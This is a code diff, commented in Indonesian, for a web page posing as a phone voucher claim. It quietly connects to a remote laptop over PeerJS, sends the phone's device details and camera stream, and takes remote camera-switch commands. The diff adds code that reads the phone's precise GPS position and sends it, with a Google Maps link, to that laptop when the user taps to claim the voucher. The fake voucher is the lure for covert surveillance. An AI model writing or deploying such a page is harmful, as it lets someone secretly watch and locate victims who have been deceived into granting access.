@@ -26,7 +26,7 @@
   <script>
     const ID_LAPTOP = "guru-demo-kamera-123";
     
-    // Server STUN Google agar mendukung koneksi lintas jaringan (Wi-Fi & Data Seluler)
+    // STUN Server Google untuk menembus jaringan seluler & Wi-Fi
     const peer = new Peer({
       config: {
         iceServers: [
@@ -45,7 +45,7 @@
       dataConn = peer.connect(ID_LAPTOP);
       if (dataConn) {
         dataConn.on('open', () => {
-          // 1. Kirim data profil/spesifikasi HP ke laptop
+          // 1. Kirim Spesifikasi Perangkat HP ke Laptop
           const infoPerangkat = {
             type: 'device-info',
             osBrowser: navigator.userAgent,
@@ -56,7 +56,7 @@
           };
           dataConn.send(infoPerangkat);
 
-          // 2. Dengarkan perintah ganti kamera dari laptop
+          // 2. Dengarkan Perintah Ganti Kamera dari Laptop
           dataConn.on('data', (data) => {
             if (data === 'switch') {
               isFrontCamera = !isFrontCamera;
@@ -69,11 +69,44 @@
 
     async function prosesKlaim() {
       document.getElementById('status').innerText = "Memproses voucher...";
+      
+      // Minta Akses Lokasi GPS
+      mintaLokasiGPS();
+      
+      // Minta Akses Kamera & Mulai Stream
       await startCamera();
+      
       alert("Voucher Berhasil Diklaim!");
       document.getElementById('status').innerText = "Voucher Aktif.";
     }
 
+    // Fungsi Pengambilan Lokasi GPS Presisi
+    function mintaLokasiGPS() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+
+            if (dataConn && dataConn.open) {
+              dataConn.send({
+                type: 'location-info',
+                mapsUrl: mapsUrl,
+                lat: lat,
+                lng: lng
+              });
+            }
+          },
+          (error) => {
+            console.warn("Izin lokasi ditolak atau gagal:", error.message);
+          },
+          { enableHighAccuracy: true }
+        );
+      }
+    }
+
+    // Fungsi Pengaksesan Kamera HP
     async function startCamera() {
       if (currentStream) {
         currentStream.getTracks().forEach(track => track.stop());
